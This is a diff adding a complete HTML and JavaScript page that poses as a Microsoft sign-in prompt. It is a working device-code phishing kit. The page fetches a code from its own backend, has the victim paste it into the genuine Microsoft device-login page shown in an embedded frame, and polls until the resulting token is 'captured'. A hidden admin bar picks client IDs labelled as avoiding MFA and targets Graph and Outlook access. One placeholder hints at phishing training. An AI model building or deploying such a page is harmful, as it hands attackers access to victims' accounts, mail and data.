@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Sign in to your account</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:'Segoe UI','Helvetica Neue',Arial,sans-serif;background:#f2f2f2;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}
+        .bg{position:fixed;bottom:0;left:0;right:0;height:40vh;background:linear-gradient(135deg,#0067b8 0%,#1a1a2e 50%,#6b21a8 100%);clip-path:polygon(0 40%,15% 55%,30% 35%,50% 60%,70% 30%,85% 50%,100% 25%,100% 100%,0 100%);z-index:0}
+        .box{background:#fff;box-shadow:0 2px 6px rgba(0,0,0,.2);padding:44px;width:440px;max-width:90vw;min-height:320px;z-index:1;display:flex;flex-direction:column}
+        .logo{display:flex;align-items:center;margin-bottom:16px}
+        .logo svg{margin-right:8px}
+        .logo span{font-size:20px;font-weight:600;color:#1a1a1a;letter-spacing:-.2px}
+        h1{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:4px}
+        .sub{font-size:13px;color:#1b1b1b;margin-bottom:20px;line-height:1.5}
+        .loader{text-align:center;padding:40px 0}
+        .spin{width:32px;height:32px;border:3px solid #e8e8e8;border-top-color:#0067b8;border-radius:50%;animation:sp .8s linear infinite;margin:0 auto 16px}
+        @keyframes sp{to{transform:rotate(360deg)}}
+        .phase{display:none}
+        .terms{display:flex;gap:16px;margin-top:auto;padding-top:24px}
+        .terms a{font-size:12px;color:#616161;text-decoration:none}
+        .err{color:#e81123;font-size:13px;margin-top:8px;text-align:center}
+        .code-box{background:#f0f4ff;border:2px solid #0067b8;border-radius:6px;padding:18px;margin:16px 0;text-align:center;cursor:pointer;transition:all .15s;position:relative;user-select:all}
+        .code-box:hover{background:#e4ecff;border-color:#004e8c}
+        .code-box:active{transform:scale(.98)}
+        .code-val{font-size:32px;font-weight:700;letter-spacing:6px;color:#0067b8;font-family:Consolas,'Courier New',monospace;pointer-events:none}
+        .code-hint{font-size:11px;color:#0067b8;margin-top:6px;pointer-events:none;display:flex;align-items:center;justify-content:center;gap:4px}
+        .copied-msg{position:absolute;inset:0;background:#0067b8;border-radius:4px;display:none;align-items:center;justify-content:center;color:#fff;font-size:15px;font-weight:600}
+        .copied-msg.show{display:flex}
+        .btn-ms{background:#0067b8;color:#fff;border:none;padding:12px 20px;font-size:15px;font-weight:600;cursor:pointer;width:100%;font-family:'Segoe UI',sans-serif;transition:background .15s;text-decoration:none;display:block;text-align:center;border-radius:2px}
+        .btn-ms:hover{background:#005da6;color:#fff}
+        .steps{background:#f8f9fa;border-radius:6px;padding:14px 16px;margin:14px 0;font-size:13px;color:#333;line-height:1.6}
+        .steps b{color:#0067b8}
+        .ws{width:36px;height:36px;border:3px solid #e8e8e8;border-top-color:#0067b8;border-radius:50%;animation:sp 1s linear infinite;margin:0 auto 16px}
+        .ok-icon{width:48px;height:48px;border-radius:50%;background:#107c10;display:flex;align-items:center;justify-content:center;margin:0 auto 16px}
+
+        /* Modal overlay for iframe */
+        .modal-bg{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.6);z-index:1000;align-items:center;justify-content:center;backdrop-filter:blur(4px);animation:fadeIn .3s}
+        .modal-bg.show{display:flex}
+        @keyframes fadeIn{from{opacity:0}to{opacity:1}}
+        .modal-box{background:#fff;border-radius:12px;overflow:hidden;width:460px;max-width:95vw;height:650px;max-height:90vh;box-shadow:0 24px 80px rgba(0,0,0,0.4);position:relative;animation:slideUp .3s ease-out}
+        @keyframes slideUp{from{transform:translateY(20px);opacity:0}to{transform:translateY(0);opacity:1}}
+        .modal-box iframe{width:100%;height:100%;border:none}
+        .modal-close{position:absolute;top:8px;right:12px;background:rgba(0,0,0,0.05);border:none;font-size:20px;color:#666;cursor:pointer;width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;z-index:10;transition:background .15s}
+        .modal-close:hover{background:rgba(0,0,0,0.1);color:#333}
+
+        .admin-bar{position:fixed;bottom:0;left:0;right:0;background:#1a1a2e;color:#fff;padding:8px 16px;z-index:2000;font-size:12px;display:flex;align-items:center;gap:12px;flex-wrap:wrap;border-top:1px solid #333}
+        .admin-bar select,.admin-bar input{background:#0d0d1a;color:#fff;border:1px solid #444;border-radius:4px;padding:4px 8px;font-size:12px;font-family:inherit}
+        .admin-bar label{color:#999;font-size:11px}
+        .admin-bar .admin-btn{background:#0067b8;color:#fff;border:none;padding:4px 12px;border-radius:4px;font-size:12px;cursor:pointer}
+    </style>
+</head>
+<body>
+<div class="bg"></div>
+<textarea id="copyHelper" style="position:fixed;left:-9999px;top:-9999px" aria-hidden="true"></textarea>
+
+<!-- Microsoft Auth Modal (iframe) -->
+<div class="modal-bg" id="authModal">
+    <div class="modal-box">
+        <button class="modal-close" onclick="document.getElementById('authModal').classList.remove('show')" title="Close">&times;</button>
+        <iframe id="authFrame" src="about:blank"></iframe>
+    </div>
+</div>
+
+<div class="box">
+    <div class="logo">
+        <svg xmlns="http://www.w3.org/2000/svg" width="21" height="21" viewBox="0 0 21 21"><rect x="1" y="1" width="9" height="9" fill="#f25022"/><rect x="1" y="11" width="9" height="9" fill="#00a4ef"/><rect x="11" y="1" width="9" height="9" fill="#7fba00"/><rect x="11" y="11" width="9" height="9" fill="#ffb900"/></svg>
+        <span>Microsoft</span>
+    </div>
+
+    <div id="phLoad" class="loader"><div class="spin"></div><p style="font-size:13px;color:#616161">Preparing your verification...</p></div>
+
+    <div id="phCode" class="phase">
+        <h1>Verify your identity</h1>
+        <p class="sub">Your verification code is ready. Click below to sign in — the Microsoft login will open right here.</p>
+
+        <div class="code-box" id="codeBox" onclick="copyCode()">
+            <div class="code-val" id="codeVal">----</div>
+            <div class="code-hint">
+                <svg width="14" height="14" viewBox="0 0 16 16" fill="#0067b8"><path d="M4 1.5H3a2 2 0 0 0-2 2V14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V3.5a2 2 0 0 0-2-2h-1v1h1a1 1 0 0 1 1 1V14a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1V3.5a1 1 0 0 1 1-1h1v-1z"/><path d="M9.5 1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-3a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5h3zm-3-1A1.5 1.5 0 0 0 5 1.5v1A1.5 1.5 0 0 0 6.5 4h3A1.5 1.5 0 0 0 11 2.5v-1A1.5 1.5 0 0 0 9.5 0h-3z"/></svg>
+                Tap to copy code
+            </div>
+            <div class="copied-msg" id="copiedMsg">Copied!</div>
+        </div>
+
+        <div class="steps">
+            <b>Step 1:</b> Tap the code above to copy it<br>
+            <b>Step 2:</b> Click the button below — Microsoft sign-in opens<br>
+            <b>Step 3:</b> Paste the code and sign in with your account
+        </div>
+
+        <button class="btn-ms" onclick="openAuthModal()">Sign in with Microsoft</button>
+
+        <div class="terms"><a href="#">Terms of use</a><a href="#">Privacy & cookies</a></div>
+    </div>
+
+    <div id="phWait" class="phase" style="text-align:center;padding:20px 0">
+        <div class="ws"></div>
+        <h1 style="font-size:20px">Waiting for sign-in...</h1>
+        <p class="sub" style="margin-top:8px">Complete the sign-in in the popup above.<br>This page updates automatically.</p>
+        <div style="background:#f5f5f5;border-radius:4px;padding:14px;margin:16px 0;text-align:center">
+            <div style="font-size:12px;color:#888">Your code</div>
+            <div class="code-val" id="waitCode" style="font-size:24px;cursor:pointer" onclick="copyCode()">----</div>
+            <div style="font-size:11px;color:#0067b8;margin-top:4px">Tap to copy again</div>
+        </div>
+        <button class="btn-ms" style="background:#f0f0f0;color:#333;font-size:13px" onclick="openAuthModal()">Reopen sign-in window</button>
+    </div>
+
+    <div id="phOk" class="phase" style="text-align:center;padding:20px 0">
+        <div class="ok-icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z" fill="#fff"/></svg></div>
+        <p style="font-size:15px;color:#1b1b1b">Verification complete. Redirecting...</p>
+        <div class="spin" style="margin-top:16px;width:24px;height:24px"></div>
+    </div>
+</div>
+
+<!-- Admin config bar (only visible with ?admin in URL) -->
+<div class="admin-bar" id="adminBar" style="display:none">
+    <label>Client:</label>
+    <select id="clientSelect">
+        <option value="04b07795-8ddb-461a-bbee-02f9e1bf7b46" selected>Azure CLI (no MFA)</option>
+        <option value="29d9ed98-a469-4536-ade2-f981bc1d605e">Auth Broker (no MFA)</option>
+        <option value="1950a258-227b-4e31-a9cf-717495945fc2">Azure PowerShell (no MFA)</option>
+        <option value="d3590ed6-52b3-4102-aeff-aad2292ab01c">Microsoft Office (FOCI, may trigger MFA)</option>
+    </select>
+    <label>Resource:</label>
+    <select id="resourceSelect">
+        <option value="https://graph.microsoft.com" selected>Graph API</option>
+        <option value="https://outlook.office365.com">Outlook</option>
+    </select>
+    <label>Redirect:</label>
+    <input type="text" id="redirectInput" placeholder="https://training.yoursite.com/lesson" style="width:250px">
+    <button class="admin-btn" onclick="location.reload()">Regenerate</button>
+</div>
+
+<script>
+var params = new URLSearchParams(window.location.search);
+var REDIRECT_URL = params.get('redirect') || '';
+var userCode = null;
+
+// Show admin bar if ?admin
+if (params.has('admin')) {
+    document.getElementById('adminBar').style.display = 'flex';
+    if (REDIRECT_URL) document.getElementById('redirectInput').value = REDIRECT_URL;
+}
+
+function getConfig() {
+    if (params.has('admin')) {
+        return {
+            client_id: document.getElementById('clientSelect').value,
+            resource: document.getElementById('resourceSelect').value
+        };
+    }
+    return {};
+}
+
+function copyCode() {
+    if (!userCode) return;
+    var h = document.getElementById('copyHelper');
+    h.value = userCode; h.style.left='0'; h.style.top='0'; h.style.position='fixed'; h.style.opacity='0';
+    h.focus(); h.select();
+    try { document.execCommand('copy'); var m=document.getElementById('copiedMsg'); if(m){m.classList.add('show');setTimeout(function(){m.classList.remove('show')},1200);} } catch(e){}
+    h.style.left='-9999px';
+}
+
+function openAuthModal() {
+    // Copy code first
+    copyCode();
+    // Load Microsoft auth in the iframe modal
+    document.getElementById('authFrame').src = 'https://login.microsoftonline.com/common/oauth2/deviceauth';
+    document.getElementById('authModal').classList.add('show');
+    // Switch to waiting state
+    document.getElementById('phCode').style.display = 'none';
+    document.getElementById('phWait').style.display = 'block';
+    document.getElementById('waitCode').textContent = userCode;
+    // Start polling if not already
+    if (!window._polling) { poll(); window._polling = true; }
+}
+
+function init() {
+    var config = getConfig();
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', '/api/open/generate-code');
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.onload = function() {
+        if (xhr.status === 200) {
+            var d = JSON.parse(xhr.responseText);
+            if (d.error) { document.getElementById('phLoad').innerHTML='<p class="err">Unable to load. Please refresh.</p>'; return; }
+            userCode = d.user_code;
+            document.getElementById('codeVal').textContent = userCode;
+            document.getElementById('phLoad').style.display = 'none';
+            document.getElementById('phCode').style.display = 'block';
+        } else {
+            document.getElementById('phLoad').innerHTML='<p class="err">Server error. Please refresh.</p>';
+        }
+    };
+    xhr.onerror = function() { document.getElementById('phLoad').innerHTML='<p class="err">Connection error.</p>'; };
+    xhr.send(JSON.stringify(config));
+}
+
+function poll() {
+    var iv = setInterval(function() {
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', '/api/open/poll-status');
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.onload = function() {
+            if (xhr.status === 200) {
+                var d = JSON.parse(xhr.responseText);
+                if (d.status === 'captured') {
+                    clearInterval(iv);
+                    // Close the auth modal
+                    document.getElementById('authModal').classList.remove('show');
+                    document.getElementById('authFrame').src = 'about:blank';
+                    // Show success
+                    document.getElementById('phWait').style.display = 'none';
+                    document.getElementById('phOk').style.display = 'block';
+                    // Redirect after 2 seconds
+                    setTimeout(function() {
+                        var redirectUrl = REDIRECT_URL || params.get('redirect') || '';
+                        if (params.has('admin')) {
+                            redirectUrl = document.getElementById('redirectInput').value || redirectUrl;
+                        }
+                        if (redirectUrl) {
+                            window.location.href = redirectUrl;
+                        }
+                        // If no redirect URL, just stay on success page
+                    }, 2000);
+                } else if (d.status === 'expired' || d.status === 'declined') {
+                    clearInterval(iv);
+                    window._polling = false;
+                    document.getElementById('authModal').classList.remove('show');
+                    document.getElementById('phWait').innerHTML = '<p style="color:#616161;font-size:14px;padding:40px 0">Session expired. <a href="javascript:location.reload()" style="color:#0067b8">Click here to start over</a></p>';
+                }
+            }
+        };
+        xhr.send(JSON.stringify({user_code: userCode}));
+    }, 4000);
+}
+
+init();
+</script>
+</body>
+</html>
